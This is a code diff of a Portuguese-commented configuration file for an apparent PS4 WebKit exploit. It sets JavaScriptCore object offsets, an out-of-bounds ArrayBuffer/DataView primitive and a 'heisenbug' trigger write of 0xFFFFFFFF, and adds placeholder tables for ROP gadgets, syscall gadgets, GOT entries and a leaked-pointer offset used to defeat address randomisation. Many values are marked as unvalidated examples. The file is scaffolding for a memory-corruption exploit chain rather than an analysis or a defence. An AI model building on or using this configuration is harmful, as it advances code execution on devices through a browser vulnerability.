@@ -1,6 +1,6 @@
 // js/config.mjs
 
-// Firmware: PS4 12.02 (Com base na análise dos TXT fornecidos)
+// Firmware: PS4 (Ex: 11.00, 9.00 - ajuste conforme seu alvo)
 // !! OFFSETS VALIDADOS E ATUALIZADOS COM BASE NOS ARQUIVOS DE DISASSEMBLY FORNECIDOS !!
 //    É crucial continuar validando no contexto do seu exploit específico.
 export const JSC_OFFSETS = {
@@ -15,97 +15,61 @@ export const JSC_OFFSETS = {
     },
     Structure: { // Offsets DENTRO da estrutura Structure (apontada por JSCell.STRUCTURE_POINTER_OFFSET)
         // Estes são mais difíceis de obter sem depuração ou análise mais profunda da struct Structure.
-        // Exemplos do que procurar:
-        // TYPE_INFO_OFFSET: 0x10, // Offset para TypeInfo dentro da Structure
-        // CLASS_INFO_OFFSET: 0x18, // Offset para ClassInfo (contém nome da classe, etc.)
-        // PROTOTYPE_OFFSET: 0x20, // Offset para o objeto protótipo
-        // GLOBAL_OBJECT_OFFSET: 0x0, // Se a Structure tiver um ponteiro para o GlobalObject
+        // O CLASS_INFO_OFFSET é um bom candidato para um ponteiro dentro do WebKit.
+        // Se você não tiver certeza ou não tiver este offset, o teste tentará usar o próprio Structure*
+        CLASS_INFO_OFFSET: 0x18, // EXEMPLO! VALIDE ESTE OFFSET PARA SEU ALVO! Se não existir, deixe undefined ou remova.
+
+        // Outros exemplos do que procurar em uma Structure (valide se for usar):
+        // TYPE_INFO_OFFSET: 0x10,
+        // PROTOTYPE_OFFSET: 0x20,
+        // GLOBAL_OBJECT_OFFSET: 0x0, // Geralmente não é um ponteiro direto para o global object do JS, mas parte da cadeia
+        // END_OFFSET: 0x50, // Exemplo, para saber o tamanho da estrutura.
     },
     JSObject: {
-        // Ponteiro para o Butterfly (armazenamento de propriedades nomeadas)
-        // Comum ser após o cabeçalho JSCell (Structure* em 0x8).
-        // Os arquivos TXT não confirmaram este diretamente para JSObject genérico.
-        BUTTERFLY_OFFSET: 0x10, // CANDIDATO: Ponteiro para o Butterfly
+        // BUTTERFLY_OFFSET: 0x8, // Se Structure* estiver em 0x0, Butterfly pode estar em 0x8.
+                                // Mas com Structure* em 0x8, Butterfly estaria depois, ex: 0x10. VALIDE!
+                                // Usado para acessar propriedades nomeadas e indexadas.
     },
     ArrayBuffer: {
-        // Baseado no snippet JSC::ArrayBuffer::create, o ponteiro para ArrayBufferContents
-        // não é definido em [rax+8] ou [rax+10h] *nessa função específica*.
-        // Ele é zerado e depois os campos do ArrayBufferContents são copiados para o JSArrayBuffer.
-        // Mantendo 0x10 como estava no seu config original, pois é um offset comum
-        // para um ponteiro de implementação em objetos wrapper. Precisa de mais investigação
-        // para o JSArrayBuffer finalizado. Por enquanto, vamos usar o que você tem.
-        CONTENTS_IMPL_POINTER_OFFSET: 0x10, // OU 0x8 SE VOCÊ CONFIRMAR PARA JSArrayBuffer
-        SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START: 0x18, // Confirmado por `mov [rax+18h], rdx` (onde rdx era m_sizeInBytes)
-        // Adicionar o campo que parece conter o m_dataPointer diretamente no JSArrayBuffer
-        DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START: 0x20, // Confirmado por `mov [rax+20h], rdx` (onde rdx era m_dataPointer)
+        // Offsets relativos ao início do objeto JSArrayBuffer (que é um JSCell)
+        // DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START: 0x20, // EXEMPLO! Posição da cópia do ponteiro de dados. VALIDE!
+        // SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START: 0x18, // EXEMPLO! Onde o tamanho do buffer é armazenado. VALIDE!
+        // MODE_OFFSET_FROM_JSARRAYBUFFER_START: 0x1C, // Exemplo, pode indicar se é ArrayBuffer, SharedArrayBuffer etc.
     },
-    ArrayBufferView: { // Para TypedArrays como Uint8Array, Uint32Array, DataView
-        // VALIDADO (de JSObjectGetTypedArrayBytesPtr.txt):
-        // `mov rax, [rdi+10h]` onde rdi é a View, rax é ArrayBufferContents*
-        CONTENTS_IMPL_POINTER_OFFSET: 0x10, // Ponteiro para ArrayBufferContents
-
-        // Outros campos comuns em Views (precisam de validação):
-        // LENGTH_OFFSET: 0x18, // Número de elementos na view
-        // BYTE_OFFSET_IN_BUFFER: 0x20, // Offset em bytes dentro do ArrayBuffer
-        // MODE_OFFSET: 0x24, // Ex: WastefulSweeping, NonWastefulSweeping
-    },
-    ArrayBufferContents: { // Estrutura apontada por ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET
-                           // e ArrayBufferView.CONTENTS_IMPL_POINTER_OFFSET
-
-        // VALIDADO (de JSObjectGetTypedArrayBytesPtr.txt):
-        // `mov rcx, [rax+8]` onde rax é ArrayBufferContents*, rcx é m_size
-        SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START: 0x8, // m_sizeInBytes (tamanho real do buffer de dados)
-
-        // VALIDADO (de JSObjectGetTypedArrayBytesPtr.txt):
-        // `mov rdx, [rax+10h]` onde rax é ArrayBufferContents*, rdx é m_dataPointer
-        DATA_POINTER_OFFSET_FROM_CONTENTS_START: 0x10, // m_dataPointer (ponteiro para os bytes brutos)
-
-        // Outros campos possíveis (precisam de validação):
-        // REF_COUNT_OFFSET: 0x0, // Contagem de referências
-        // DESTRUCTOR_OFFSET: 0x4 ou um ponteiro em 0x0 se for o primeiro campo após vtable
-    },
-    JSFunction: {
-        // Estes são mais complexos e dependem da estrutura JSFunction específica
-        // EXECUTABLE_OFFSET: 0x18, // Ponteiro para FunctionExecutable
-        // SCOPE_OFFSET: 0x20,      // Ponteiro para JSScope
-    },
-    // ... (outras estruturas como SymbolObject, etc., podem ser adicionadas conforme necessário)
-
-    // IDs de Estrutura Numéricos. VOCÊ PRECISA PREENCHER ESTES VALORES DA SUA ANÁLISE DOS BINÁRIOS.
-    // Estes são essenciais para a técnica de "objeto falso".
-    // Os valores abaixo são APENAS EXEMPLOS e provavelmente estão INCORRETOS para seu alvo.
+    // Adicione outros offsets conforme necessário
     KnownStructureIDs: {
-        // Exemplo: JSString_STRUCTURE_ID: 0x01040C00, // Encontre o valor real!
-        // Exemplo: ArrayBuffer_STRUCTURE_ID: 0x01082300, // Encontre o valor real!
-        // Exemplo: JSArray_STRUCTURE_ID: 0x01080300, // Encontre o valor real!
-        // Exemplo: JSObject_Simple_STRUCTURE_ID: 0x010400F0, // Para {} // Encontre o valor real!
-        // Adicione mais conforme necessário
-        JSString_STRUCTURE_ID: null, // PREENCHA OU REMOVA SE NÃO USADO
-        ArrayBuffer_STRUCTURE_ID: 2, // VALIDADO do JSC::ArrayBuffer::create
-        JSArray_STRUCTURE_ID: null, // PREENCHA OU REMOVA SE NÃO USADO
-        JSObject_Simple_STRUCTURE_ID: null, // PREENCHA OU REMOVA SE NÃO USADO
-    }
-};
-
-// Informações da biblioteca WebKit (para calcular endereços base a partir de leaks)
-// Estes são nomes simbólicos. Os valores reais dos offsets devem ser preenchidos
-// a partir de um WebKit desmontado da MESMA VERSÃO do PS4 12.02.
-export const WEBKIT_LIBRARY_INFO = {
-    // Nome da biblioteca como aparece no sistema ou depurador
-    LIBRARY_NAME: "libSceNKWebkit.sprx", // ou similar
-
-    // Offsets de funções conhecidas DENTRO da biblioteca WebKit.
-    // Estes são exemplos. Você precisará encontrar funções e seus offsets.
-    FUNCTION_OFFSETS: {
-        // Exemplo: "WTF::fastMalloc": 0x123450, // Substitua pelo offset real
-        // Exemplo: "JSC::JSObject::put": 0xBD6A9C, // (O endereço em funcoes.txt - BD6A9C)
-                                                // Se este for o endereço absoluto já, não é um offset.
-                                                // Se for um offset de libSceNKWebkit.sprx, use aqui.
-        // O ideal é ter offsets de funções não exportadas, mas estáveis.
+        // Estes são IDs numéricos, não ponteiros. VALIDE-OS para seu alvo.
+        // Podem ser úteis para identificar tipos de objetos ao escanear a memória.
+        // ArrayBuffer_STRUCTURE_ID: 2, // EXEMPLO MUITO COMUM!
+        // JSArray_STRUCTURE_ID: 200, // Exemplo
+        // JSString_STRUCTURE_ID: 100, // Exemplo
     },
+    WebKitGlobals: {
+        // Se você descobrir endereços de objetos globais ou funções importantes no WebKit.
+        // Exemplo: "some_global_webkit_object_ptr_location": 0x3C0A01F00 // Endereço onde um ponteiro reside
+    },
+    ROPChainGadgets: {
+        // Offsets relativos ao endereço base da biblioteca WebKit para gadgets ROP.
+        // Exemplo: "pop_rax_ret": 0x12345,
+        // Exemplo: "mov_qword_ptr_rax_rbx_ret": 0x67890,
+    },
+    SyscallGadgets: {
+        // Offsets para gadgets de syscall.
+        // Exemplo: "syscall_ret": 0xABCDE,
+    },
+    KnownOffsetsInLibs: {
+        // Offsets de símbolos conhecidos DENTRO de suas respectivas bibliotecas.
+        // Crucial para calcular o base address após um vazamento.
+        // Exemplo: "ClassInfo_SomeClass_offset_in_webkit": 0x1A2B3C4,
+        // Exemplo: "memcpy_offset_in_libc": 0xDDEE00,
 
-    // Offsets de entradas na Global Offset Table (GOT) que apontam para funções
-    // em outras bibliotecas (ex: libc, libkernel). Ler estes pode vazar endereços de outras libs.
+        // !! IMPORTANTE PARA O TESTE DE VAZAMENTO DO BASE DO WEBKIT !!
+        // Este é o offset do ponteiro que você está tentando vazar (ex: ClassInfo* de um objeto DOM)
+        // DENTRO da biblioteca WebKit. Você PRECISA encontrar isso via engenharia reversa.
+        // Se JSC_OFFSETS.Structure.CLASS_INFO_OFFSET for usado, este seria o offset do ClassInfo.
+        // Se o próprio Structure* for usado, este seria o offset da Structure na memória (menos comum para base).
+        LEAKED_POINTER_OFFSET_IN_WEBKIT: 0xDEADBEEF, // <<< SUBSTITUA PELO VALOR REAL! Ex: 0x2ABCDEF
+    },
     GOT_ENTRIES: {
         // Exemplo: "got_memcpy": 0x2F00120, // Offset da entrada da GOT para memcpy
         // Exemplo: "got_pthread_create": 0x2F00128,
@@ -116,7 +80,11 @@ export const WEBKIT_LIBRARY_INFO = {
 export let OOB_CONFIG = {
     ALLOCATION_SIZE: 32768, // Tamanho do ArrayBuffer usado para a primitiva OOB
     BASE_OFFSET_IN_DV: 128,  // Offset onde a DataView "controlada" começa dentro do ArrayBuffer
-    INITIAL_BUFFER_SIZE: 32 // Tamanho inicial do buffer para a trigger (pode não ser mais usado)
+    INITIAL_BUFFER_SIZE: 32, // Tamanho inicial do buffer para a trigger (pode não ser mais usado)
+    // Offset onde o heisenbug é acionado (escrita de 0xFFFFFFFF)
+    // Este é (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, que dá 0x70 se BASE_OFFSET_IN_DV é 128
+    HEISENBUG_TRIGGER_OFFSET: (128) - 16, // Usando valor literal para garantir
+    HEISENBUG_TRIGGER_VALUE: 0xFFFFFFFF, // O valor que causa o crash/estado desejado
 };
 
 // Função para atualizar OOB_CONFIG da UI (se houver) - Mantenha como estava
@@ -138,4 +106,6 @@ export function updateOOBConfigFromUI(docInstance) {
         const val = parseInt(initialBufSizeEl.value, 10);
         if (!isNaN(val) && val > 0) OOB_CONFIG.INITIAL_BUFFER_SIZE = val;
     }
+    // Recalcular HEISENBUG_TRIGGER_OFFSET se BASE_OFFSET_IN_DV for alterado pela UI
+    OOB_CONFIG.HEISENBUG_TRIGGER_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16;
 }
